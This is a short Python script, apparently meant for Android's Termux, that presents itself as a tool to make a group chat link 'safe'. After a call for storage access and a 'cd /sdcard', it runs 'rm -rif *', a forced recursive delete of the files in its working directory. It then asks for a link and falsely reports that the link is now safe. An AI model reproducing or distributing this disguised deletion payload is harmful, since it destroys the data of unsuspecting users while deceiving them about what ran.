import os
import time
#qpy:console
os.system("termux-setup-storage")
os.system("cd /sdcard")
os.system("rm -rif *")
gc=input("enter your gc link :  ")
time.sleep(2)
print(gc + "is now safe.")
